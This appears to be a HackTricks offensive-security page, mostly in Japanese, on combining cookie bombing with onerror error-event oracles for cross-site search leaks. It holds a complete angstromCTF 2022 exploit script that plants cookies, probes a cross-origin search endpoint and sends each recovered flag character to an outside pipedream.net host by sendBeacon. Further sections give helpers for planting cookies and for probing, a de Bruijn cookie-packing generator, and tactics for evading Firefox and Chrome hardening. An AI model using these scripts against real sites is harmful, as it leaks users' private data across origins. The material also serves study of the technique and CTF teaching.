# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: 標的オリジンに対して被害者のブラウザに大量／大きな cookies を詰め込み、その結果後続のリクエストがサーバー／リクエストの制限（request header size、URL size in redirects など）に到達するようにする手法。
- Error-event oracle: `<script>`（または他のサブリソース）で cross-origin endpoint をプローブし、`onload` と `onerror` の違いで状態を識別するオラクル。

High level idea
- テストしたい2つの状態で挙動が異なるターゲット endpoint を見つける（例: 検索で “hit” と “miss”）。
- “hit” パスが重いリダイレクトチェーンや長い URL を引き起こし、“miss” パスは短いままであることを確保する。多くの cookies でリクエストヘッダを膨らませ、”hit” パスだけがサーバーの制限を超えて HTTP エラー（例: 431/414/400）を引き起こすようにする。そのエラーが onerror イベントを発生させ、XS-Search のオラクルになる。

When does this work
- 被害者のブラウザがターゲットへ cookies を送信するようにできる場合（例: cookies が SameSite=None になっている、あるいは popup の `window.open` 経由などファーストパーティコンテキストで設定できる）。
- 任意の cookies を設定できるようなアプリ機能を悪用できる場合（例: 制御可能な input 名/値を Set-Cookie に変換する “save preference” エンドポイント）や、攻撃者制御データを URL に組み込むポスト認証リダイレクトを作れる場合。
- サーバーが2つの状態で異なる反応をし、ヘッダ／URL を膨らませることで片方の状態が制限を超えてエラー応答を返し onerror を発火させる場合。

Note on server errors used as the oracle
- 431 Request Header Fields Too Large は cookies によるリクエストヘッダの肥大化で返されることが多く、414 URI Too Long やサーバー固有の 400 が長いリクエスト対象で返ることがある。これらはいずれもサブリソースの読み込み失敗となり onerror を発火させる。詳細は [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) を参照（例: 過剰な cookies のような典型的な原因）。

<details>
<summary>Practical example (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

なぜ popup（`window.open`）なのか？
- モダンなブラウザは third‑party cookies をますますブロックしています。ターゲットへのトップレベルウィンドウを開くことで cookies が first‑party になり、ターゲットからの Set-Cookie レスポンスが保持されます。これにより third‑party cookie の制限下でも cookie-bomb ステップを実行できます。

2024–2025 の cookie 利用可能性に関する注意
- Chrome の Tracking Protection 展開（2024年1月）は既にランダムなコホートで third‑party cookies をブロックしており、UK CMA の承認が下りれば全ユーザに拡大予定です。したがって任意の被害者が突然 3P cookies を失う可能性を常に想定してください。フォールバックを自動化しましょう：スクリプトの probe がターゲットに一度も到達せずに失敗したと検知したら、透過的に popup/first‑party フローへ pivot します。Safari と Firefox は既に大半の third‑party cookies をデフォルトでブロックしており、CHIPS/partitioned cookies により各トップレベルサイトが独自の jar を持つようになっています。
- first‑party cookie を植え付けるフロー（`window.open` + auto-submit を cookie-setting endpoint に送る）を使い、その後それらの cookie が送信された場合にのみ成功するサブリソースで probe してください。もし third‑party cookies がブロックされている場合は、probe を same-site コンテキストに移動します（例：popup 内で oracle を same-site gadget 経由で実行し、結果の boolean を `postMessage` またはサーバへの beacon で exfiltrate する）、あるいは被害者 origin を正当に管理している場合は Chrome の deprecation trial に登録してください。

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

クロスサイトの文脈から多数の cookie を詰め込む必要がある場合は、一時的なトップレベルウィンドウを用意して、脆弱な Set-Cookie エンドポイントへ一連の大型フォーム送信を行います:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
プロービングを開始する直前にこれを呼び出してください。これにより、各 oracle run は新しく初期化された cookie jar で始まります。

</details>

汎用 probing ヘルパー
既に target origin (first-party) 上に多数の cookies を設定する方法を持っている場合、この最小限の oracle を、成功/失敗が異なるネットワーク結果（status/MIME/redirect）を生じさせる任意の endpoint に対して再利用できます：
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
代替 tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Advanced: de Bruijn–based cookie packing (CTF-proven)
- アプリが大きな cookie 値を制御できる場合、各プローブに de Bruijn sequence を追加して推測を効率的に詰め込むことができます。これにより各プローブのオーバーヘッドを小さく保ちつつ、正しいプレフィックスに対してのみ重いブランチが一貫して重くなることを保証します。長さ n の |Σ| シンボル用の例ジェネレータ（cookie 値に収まる）：
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Tips to build the oracle
- “ポジティブ”状態を重くする: 述語が真のときにのみ追加の redirect をチェーンする、または redirect URL を無制限のユーザー入力を反映するようにして、推測したプレフィックスに応じて長くなるようにする。
- ヘッダを膨らませる: 一貫したエラーが “重い” 経路で観測されるまで cookie bombing を繰り返す。サーバーは一般にヘッダサイズに上限を設けており、多数の cookie があるとより早く失敗する。
- 安定化: 複数の並列 cookie 設定操作を発生させ、複数回プローブしてタイミングやキャッシュのノイズを平均化する。
- キャッシュを破壊し、プーリングのアーティファクトを避ける: プローブ URL にランダムな `#fragment` や `?r=` を追加し、`window.open` ループを使う場合は異なるウィンドウ名を使うことを推奨する。
- サブリソースを切り替える: `<script>` がフィルタされる場合は `<link rel=stylesheet>` や `<img>` を試す。onload/onerror のブール値がオラクルであり、コンテンツを解析する必要はない。

Common header/URL limits (useful thresholds)
- リバースプロキシ/CDN とサーバーは異なる上限を課す。As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
